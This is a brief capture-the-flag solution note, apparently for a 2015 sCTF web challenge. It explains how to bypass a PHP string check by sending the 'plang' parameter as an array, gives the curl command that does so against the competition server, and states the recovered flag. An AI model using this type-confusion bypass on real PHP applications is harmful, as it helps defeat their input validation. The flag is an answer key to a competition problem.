# Since this checks for the position of "answer" in $_GET["plang"] and the string length less than 2, we can just use arrays and screw with it

curl "http://compete.sctf.io/problems/2015q1/jz/main.php?plang\[\]=a"

# Flag: arrays_and_strings
